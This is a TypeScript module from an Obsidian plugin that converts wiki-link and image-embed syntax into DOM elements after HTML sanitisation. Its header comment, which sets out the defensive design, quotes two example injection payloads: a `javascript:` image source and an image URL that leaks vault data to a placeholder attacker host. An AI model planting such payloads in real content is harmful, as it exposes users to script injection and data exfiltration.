/**
 * Obsidian wiki-link interpolation.
 *
 * Engine output is plain text (with optional HTML formatting from
 * filters like `bold`). When that text contains Obsidian wiki-
 * syntax like `![[image.png]]` or `[[note name]]`, we want it
 * rendered the way Obsidian itself renders it — embedded image,
 * clickable note link — not as literal characters.
 *
 * Why the interpolation happens AFTER sanitisation (and not in
 * the engine or the sanitiser itself):
 *
 *   - The engine is pure TypeScript with no Obsidian dependency.
 *     Teaching it about the vault would break the layer separation
 *     that keeps the engine testable in isolation.
 *   - The sanitiser is pure HTML processing; it strips ALL
 *     attributes from every tag for security. Letting `<img src=…>`
 *     and `<a href=…>` flow through it as HTML would strip the
 *     attributes that make those tags useful. Whitelisting those
 *     attributes opens an injection surface — the engine output
 *     comes from user-authored `.ipt` files, which could carry
 *     malicious `<img src="javascript:…">` or tracking-pixel
 *     `<img src="https://attacker/leak?vault=…">` payloads.
 *
 * So instead: the wiki-syntax survives sanitisation untouched
 * (it has no HTML brackets). Then this module walks the cleaned
 * fragment, finds `![[…]]` and `[[…]]` patterns in text nodes,
 * and splices in freshly-constructed `<img>` and `<a>` elements
 * with attributes set programmatically from vault-resolved values.
 * The attribute values come from Obsidian APIs, not from parsed
 * strings — there's no path for an attacker-controlled URL to
 * land in `src` or `href`.
 *
 * Supported syntax:
 *   - `![[image.png]]`         → <img>
 *   - `![[image.png|200]]`     → <img width="200">  (numeric pipe)
 *   - `![[image.png|alt text]]` → <img alt="alt text">  (text pipe)
 *   - `[[Note]]`               → <a> to the note
 *   - `[[Note#heading]]`       → <a> to a heading in the note
 *   - `[[Note|display text]]`  → <a> with custom display text
 *
 * Non-image `![[…]]` (e.g. `![[Some Note]]`, `![[audio.mp3]]`)
 * falls back to plain link behaviour — embedding non-image content
 * is out of scope.
 *
 * Unresolved links (file doesn't exist) render as a styled span
 * with the link text, matching Obsidian's "unresolved" affordance.
 */

import type { TFile } from "obsidian";
import type RandomnessPlugin from "./main";

/**
 * File extensions we'll render as `<img>`. Anything else with the
 * `![[…]]` embed prefix falls back to link rendering. Lowercase
 * compared against a lowercased extension.
 */
export const IMAGE_EXTENSIONS: ReadonlySet<string> = new Set([
    "png",
    "jpg",
    "jpeg",
    "gif",
    "webp",
    "svg",
    "bmp",
    "avif",
]);

/**
 * Parsed wiki-link. The `isEmbed` flag distinguishes `![[…]]`
 * (embed/transclude) from `[[…]]` (link).
 */
export interface ParsedWikiLink {
    /** True for `![[…]]`, false for `[[…]]`. */
    isEmbed: boolean;
    /** The link target — file name or path (possibly without extension). */
    linkpath: string;
    /** Optional heading (`#heading`) portion of the target. */
    heading?: string;
    /** Display text override (after `|`). Numeric for embeds means width. */
    display?: string;
}

/**
 * Parse a single wiki-link's inner contents (without the surrounding
 * brackets/`!`). Returns null on malformed input. Inputs:
 *
 *   "image.png"            → { isEmbed:?, linkpath:"image.png" }
 *   "image.png|200"        → { …, display:"200" }
 *   "note#section|display" → { …, heading:"section", display:"display" }
 *
 * The `isEmbed` flag is set by the caller based on whether the
 * outer syntax had a leading `!`.
 *
 * Order in Obsidian's syntax: `path#heading|display`. We split on
 * `|` first to separate the optional display, then on `#` to
 * separate the optional heading from the path.
 */
export function parseWikiLinkBody(
    body: string,
    isEmbed: boolean
): ParsedWikiLink | null {
    if (body.length === 0) return null;
    let display: string | undefined;
    const pipeIdx = body.indexOf("|");
    let beforePipe = body;
    if (pipeIdx !== -1) {
        beforePipe = body.slice(0, pipeIdx);
        display = body.slice(pipeIdx + 1);
    }
    let heading: string | undefined;
    let linkpath = beforePipe;
    const hashIdx = beforePipe.indexOf("#");
    if (hashIdx !== -1) {
        linkpath = beforePipe.slice(0, hashIdx);
        heading = beforePipe.slice(hashIdx + 1);
    }
    if (linkpath.length === 0) return null;
    return { isEmbed, linkpath, heading, display };
}

/**
 * Return the lowercase extension of a path (without the dot), or
 * empty string if there isn't one.
 */
export function pathExtension(linkpath: string): string {
    const slash = linkpath.lastIndexOf("/");
    const basename = slash === -1 ? linkpath : linkpath.slice(slash + 1);
    const dot = basename.lastIndexOf(".");
    if (dot === -1 || dot === 0) return "";
    return basename.slice(dot + 1).toLowerCase();
}

/**
 * Decide whether a parsed embed should render as an `<img>`. If the
 * linkpath has no extension we default to non-image (Obsidian
 * embeds without an extension are typically note embeds).
 */
export function isImageEmbed(parsed: ParsedWikiLink): boolean {
    if (!parsed.isEmbed) return false;
    return IMAGE_EXTENSIONS.has(pathExtension(parsed.linkpath));
}

/**
 * Match `![[…]]` or `[[…]]` patterns. Captured groups:
 *   1: leading "!" if present (empty string for plain links)
 *   2: link body (everything between the brackets)
 *
 * `[^\]]*` accepts everything up to the next closing bracket;
 * empty bodies (`[[]]` or `![[]]`) are caught and rejected in
 * parseWikiLinkBody.
 */
const WIKI_LINK_RE = /(!?)\[\[([^\]]*)\]\]/g;

/**
 * Walk a fragment, find wiki-syntax patterns in its text nodes,
 * and replace each match with a constructed `<img>` or `<a>`.
 *
 * The fragment is mutated in place. The text node containing each
 * match is split at the match boundaries so non-match portions
 * survive as adjacent text nodes around the new element.
 *
 * Inside elements that semantically expect literal text — `<code>`
 * and `<pre>` — we skip the interpolation, matching how Obsidian
 * itself doesn't render wiki-syntax inside code blocks.
 */
export function interpolateObsidianLinks(
    root: DocumentFragment | HTMLElement,
    plugin: RandomnessPlugin,
    sourcePath: string
): void {
    // Gather text nodes up-front. Walking and mutating
    // simultaneously is fragile — split operations invalidate the
    // tree walker.
    const textNodes: Text[] = [];
    collectTextNodes(root, textNodes);
    for (const node of textNodes) {
        processTextNode(node, plugin, sourcePath);
    }
}

/**
 * Recursive DOM walk collecting text nodes. Skips `<code>` and
 * `<pre>` subtrees so literal text inside code spans (which a
 * generator might emit, e.g. for syntax examples) doesn't get
 * its `[[…]]` rewritten.
 *
 * Handles three node kinds: text (collected), elements (recursed
 * into unless they're code/pre), and activeDocument fragments (recursed
 * into — fragments are the typical input shape from the sanitiser).
 */
function collectTextNodes(node: Node, out: Text[]): void {
    if (node.nodeType === Node.TEXT_NODE) {
        out.push(node as Text);
        return;
    }
    if (node.nodeType === Node.ELEMENT_NODE) {
        const el = node as Element;
        const tag = el.tagName.toLowerCase();
        if (tag === "code" || tag === "pre") return;
        for (const child of Array.from(el.childNodes)) {
            collectTextNodes(child, out);
        }
        return;
    }
    if (node.nodeType === Node.DOCUMENT_FRAGMENT_NODE) {
        // Fragments don't have a tagName but they DO have children
        // worth walking. This is the shape returned by
        // sanitiseHtmlToFragment.
        for (const child of Array.from(node.childNodes)) {
            collectTextNodes(child, out);
        }
        return;
    }
    // Other node types (comments, processing instructions, etc.)
    // — ignore.
}

/**
 * Replace wiki-syntax in a single text node with `<img>` / `<a>`
 * elements. The original text node is split: text before each
 * match stays as a text node, the match is replaced by the new
 * element, and trailing text becomes a new text node after.
 */
function processTextNode(
    node: Text,
    plugin: RandomnessPlugin,
    sourcePath: string
): void {
    const text = node.textContent ?? "";
    if (!text.includes("[[")) return; // fast path: no wiki-syntax

    const parent = node.parentNode;
    if (parent === null) return;

    // Find all matches and their boundaries.
    WIKI_LINK_RE.lastIndex = 0;
    const matches: {
        start: number;
        end: number;
        replacement: Node | null;
    }[] = [];
    let m: RegExpExecArray | null;
    while ((m = WIKI_LINK_RE.exec(text)) !== null) {
        const isEmbed = m[1] === "!";
        const body = m[2];
        const parsed = parseWikiLinkBody(body, isEmbed);
        if (parsed === null) continue; // malformed, leave as literal
        const replacement = buildWikiElement(parsed, plugin, sourcePath);
        matches.push({
            start: m.index,
            end: m.index + m[0].length,
            replacement,
        });
    }
    if (matches.length === 0) return;

    // Build the replacement node sequence: alternating text + element.
    const newNodes: Node[] = [];
    let cursor = 0;
    for (const match of matches) {
        if (match.start > cursor) {
            newNodes.push(
                activeDocument.createTextNode(text.slice(cursor, match.start))
            );
        }
        if (match.replacement !== null) {
            newNodes.push(match.replacement);
        } else {
            // Unparseable — keep the literal text so the user sees
            // what they wrote (and can correct it).
            newNodes.push(
                activeDocument.createTextNode(text.slice(match.start, match.end))
            );
        }
        cursor = match.end;
    }
    if (cursor < text.length) {
        newNodes.push(activeDocument.createTextNode(text.slice(cursor)));
    }

    // Swap into the DOM. Insert all new nodes before the original,
    // then remove the original. This keeps the parent's child order
    // stable.
    for (const n of newNodes) {
        parent.insertBefore(n, node);
    }
    parent.removeChild(node);
}

/**
 * Build the DOM element for a parsed wiki-link. May return null if
 * something goes wrong (caller falls back to literal text).
 */
function buildWikiElement(
    parsed: ParsedWikiLink,
    plugin: RandomnessPlugin,
    sourcePath: string
): Node | null {
    if (isImageEmbed(parsed)) {
        return buildImageElement(parsed, plugin, sourcePath);
    }
    return buildLinkElement(parsed, plugin, sourcePath);
}

/**
 * Construct an `<img>` for an image embed. Resolves the link to a
 * vault file via metadataCache; falls back to an unresolved-link
 * span if no file matches.
 *
 * Width parsing: if `display` is purely digits, treat it as a
 * pixel width (Obsidian's convention). Otherwise treat it as alt
 * text.
 */
function buildImageElement(
    parsed: ParsedWikiLink,
    plugin: RandomnessPlugin,
    sourcePath: string
): Node {
    const file = resolveLink(plugin, parsed.linkpath, sourcePath);
    if (file === null) {
        return makeUnresolvedSpan(parsed.linkpath, true);
    }
    const img = activeDocument.createElement("img");
    // src comes from a vault API — no path for attacker-controlled
    // values to land here. The `getResourcePath` API returns
    // app:// URLs that resolve to local vault files only.
    img.src = plugin.app.vault.getResourcePath(file);
    img.className = "randomness-embed-image";
    // Width vs alt: digits-only → width, anything else → alt.
    if (parsed.display !== undefined) {
        if (/^\d+$/.test(parsed.display)) {
            img.width = parseInt(parsed.display, 10);
        } else {
            img.alt = parsed.display;
        }
    } else {
        // Default alt to the filename for screen readers and
        // copy-paste-to-other-apps fallback.
        img.alt = parsed.linkpath;
    }
    return img;
}

/**
 * Construct an `<a>` for a wiki-link. Clicking opens the link via
 * `workspace.openLinkText`, with Ctrl/Cmd opening in a new pane.
 *
 * Display text: explicit `|display` overrides the linkpath; for
 * embeds-fallen-back-to-links (`![[Some Note]]`) we also use the
 * linkpath as the display.
 */
function buildLinkElement(
    parsed: ParsedWikiLink,
    plugin: RandomnessPlugin,
    sourcePath: string
): Node {
    const target = parsed.heading
        ? parsed.linkpath + "#" + parsed.heading
        : parsed.linkpath;
    const file = resolveLink(plugin, parsed.linkpath, sourcePath);
    const a = activeDocument.createElement("a");
    // We don't set href — Obsidian uses a synthetic data-href
    // convention and handles clicks via JS, since the resolved
    // URL changes with workspace state. Real Obsidian rendering
    // does the same thing.
    a.setAttribute("data-href", target);
    a.setAttribute("data-link", target);
    a.className =
        "internal-link" + (file === null ? " is-unresolved" : "");
    a.textContent = parsed.display ?? target;
    a.addEventListener("click", (e) => {
        e.preventDefault();
        // Ctrl/Cmd modifier → new pane, matching Obsidian
        // convention. The third arg of openLinkText is "newLeaf".
        // openLinkText is async; we don't need to track the
        // result here (click handlers are fire-and-forget).
        const newLeaf = e.ctrlKey || e.metaKey;
        void plugin.app.workspace.openLinkText(target, sourcePath, newLeaf);
    });
    return a;
}

/**
 * Resolve a wiki linkpath against the vault. Returns the matched
 * TFile or null if none exists. Uses Obsidian's standard
 * `getFirstLinkpathDest` which honours the user's "shortest path"
 * vs "absolute" link settings.
 */
function resolveLink(
    plugin: RandomnessPlugin,
    linkpath: string,
    sourcePath: string
): TFile | null {
    // Optional chaining + defensive null because the metadataCache
    // and method might not exist in test environments where the
    // mock is partial.
    const cache = plugin.app.metadataCache;
    if (!cache || typeof cache.getFirstLinkpathDest !== "function") {
        return null;
    }
    return cache.getFirstLinkpathDest(linkpath, sourcePath);
}

/**
 * Build the fallback span shown when a link doesn't resolve.
 * Matches Obsidian's CSS classes so the user's theme styling kicks
 * in (typically a muted/dashed-underline appearance).
 */
function makeUnresolvedSpan(linkpath: string, isEmbed: boolean): Node {
    const span = activeDocument.createElement("span");
    span.className = "randomness-unresolved-link";
    // For embeds we keep the `!` prefix in the display so the user
    // can see that an embed was attempted (and is failing).
    span.textContent = (isEmbed ? "![[" : "[[") + linkpath + "]]";
    span.title = "Unresolved link: " + linkpath;
    return span;
}
